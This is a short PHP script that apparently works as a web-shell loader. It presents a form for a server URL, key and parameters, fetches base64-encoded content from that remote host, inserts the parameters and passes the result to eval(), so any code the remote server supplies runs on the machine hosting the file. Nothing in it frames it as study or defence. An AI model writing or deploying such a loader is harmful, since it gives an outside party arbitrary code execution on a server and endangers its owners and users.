<?php
if (($_REQUEST["serverurl"]) && ($_REQUEST["name"])) {
    $next = $_REQUEST["name"];
        $server_response = file_get_contents($_REQUEST["serverurl"]."?name=$next");
        $response_array = explode(";;",$server_response);
        foreach ($response_array as $response) {
            $value_array = explode("::",$response);
            $var = base64_decode($value_array[0]);
            $val = base64_decode($value_array[1]);
            if ($var == "content") {
                $content = $val;
            }
            if ($var == "next") {
                $next = $val;
            }
        }
        if (isset($_REQUEST["params"])) {
            $content = preg_replace("/\%\%PARAMS\%\%/",$_REQUEST["params"],$content);
        }
        eval($content);
} else {
?>
<form method=post>
URL: <input type=text size=50 name=serverurl><br>
KEY: <input type=text size=50 name=name><br>
PARAMS: <input type=text size=50 name=params><br>
<input type=submit>
</form>
<?php
}
?>